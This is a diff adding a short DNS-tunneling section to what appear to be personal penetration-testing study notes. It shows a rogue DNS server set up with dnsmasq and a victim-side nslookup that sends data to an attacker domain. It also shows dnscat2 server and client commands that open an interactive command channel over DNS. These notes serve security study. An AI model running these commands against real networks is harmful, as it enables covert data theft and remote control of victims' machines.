@@ -19,4 +19,19 @@
 - check this doc: https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/ 
 
 
-# DNS 
+# DNS Tunneling
+## Logic behind
+- NOT STEALTHY since so many packet 
+- UDP 53
+- reg a sussy DNS with a wanted domain name ```feline.corp ``` (this domain is important as if only original dns cant find then will redirect to you)
+- check victim current Dns server: ``` resolvectl status ```
+- run in rogue DNS server: ``` sudo dnsmasq -C dnsmasq.conf -d ``` 
+- run in victim ``` nslookup exfiltrated-data.feline.corp ``` & check ``` sudo tcpdump -i ens192 udp port 53 ``` to see if tcp have query record
+- Smuggling data thru TXT record
+
+## dnscat2
+- listen if success by traffic tcp ``` sudo tcpdump -i ens192 udp port 53 ```
+- dns server: ``` dnscat2-server feline.corp ```
+- victim: ``` ./dnscat feline.corp ```
+- open window for us to interact dns server & 1 = the window of connected (could be others so run ``` window ``` first) : ``` window -i 1 ```
+- 
